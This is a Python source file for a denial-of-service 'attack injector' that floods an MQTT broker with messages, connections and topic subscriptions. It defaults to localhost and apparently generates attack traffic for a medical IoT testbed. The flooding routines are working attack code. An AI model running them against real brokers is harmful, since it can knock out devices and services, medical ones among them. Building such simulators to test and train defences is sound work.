"""
Denial of Service (DoS) Attack Injector

Simulates various DoS attacks on MQTT broker:
- Message flooding
- Connection exhaustion
- Topic subscription flooding
"""
import paho.mqtt.client as mqtt
import time
import random
import logging
from datetime import datetime
from typing import Optional

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class DoSAttack:
    """DoS attack simulator for MQTT broker"""
    
    def __init__(self, broker_host: str = "localhost", broker_port: int = 1883):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.attack_clients = []
        self.is_attacking = False
        
    def message_flood(self, duration: int = 60, rate: int = 1000):
        """
        Flood MQTT broker with messages
        
        Args:
            duration: Attack duration in seconds
            rate: Messages per second
        """
        logger.info(f"Starting message flood attack: {rate} msg/s for {duration}s")
        
        client = mqtt.Client(
            client_id=f"attacker_flood_{random.randint(1000, 9999)}",
            protocol=mqtt.MQTTv5,
            callback_api_version=mqtt.CallbackAPIVersion.VERSION2
        )
        
        try:
            client.connect(self.broker_host, self.broker_port, 60)
            self.attack_clients.append(client)
            self.is_attacking = True
            
            start_time = time.time()
            message_count = 0
            
            while time.time() - start_time < duration and self.is_attacking:
                # Send malicious messages
                for _ in range(rate):
                    topic = f"iomt/attack/flood/{random.randint(1, 1000)}"
                    payload = f"ATTACK_{random.randint(1, 999999)}"
                    client.publish(topic, payload, qos=0)
                    message_count += 1
                
                time.sleep(1)
            
            logger.info(f"Message flood completed: {message_count} messages sent")
            
        except Exception as e:
            logger.error(f"DoS attack failed: {e}")
        finally:
            client.disconnect()
            self.is_attacking = False
    
    def connection_exhaustion(self, num_connections: int = 100):
        """
        Exhaust broker connection pool
        
        Args:
            num_connections: Number of connections to create
        """
        logger.info(f"Starting connection exhaustion: {num_connections} connections")
        
        for i in range(num_connections):
            try:
                client = mqtt.Client(
                    client_id=f"attacker_conn_{i}",
                    protocol=mqtt.MQTTv5,
                    callback_api_version=mqtt.CallbackAPIVersion.VERSION2
                )
                client.connect(self.broker_host, self.broker_port, 60)
                self.attack_clients.append(client)
                client.loop_start()
                
            except Exception as e:
                logger.error(f"Connection {i} failed: {e}")
                break
        
        logger.info(f"Connection exhaustion: {len(self.attack_clients)} connections established")
    
    def topic_subscription_flood(self, num_subscriptions: int = 10000):
        """
        Flood broker with topic subscriptions
        
        Args:
            num_subscriptions: Number of topics to subscribe to
        """
        logger.info(f"Starting subscription flood: {num_subscriptions} subscriptions")
        
        client = mqtt.Client(
            client_id=f"attacker_sub_{random.randint(1000, 9999)}",
            protocol=mqtt.MQTTv5,
            callback_api_version=mqtt.CallbackAPIVersion.VERSION2
        )
        
        try:
            client.connect(self.broker_host, self.broker_port, 60)
            self.attack_clients.append(client)
            
            # Subscribe to many topics
            for i in range(num_subscriptions):
                topic = f"iomt/attack/sub/{i}/+"
                client.subscribe(topic)
            
            logger.info("Subscription flood completed")
            
        except Exception as e:
            logger.error(f"Subscription flood failed: {e}")
    
    def stop(self):
        """Stop all active attacks"""
        logger.info("Stopping all DoS attacks...")
        self.is_attacking = False
        
        for client in self.attack_clients:
            try:
                client.disconnect()
            except:
                pass
        
        self.attack_clients.clear()
        logger.info("All attacks stopped")


if __name__ == "__main__":
    # Test DoS attack
    attacker = DoSAttack()
    
    print("Starting DoS attack test (10 seconds)...")
    attacker.message_flood(duration=10, rate=100)
    
    time.sleep(2)
    attacker.stop()
    print("Attack test completed")
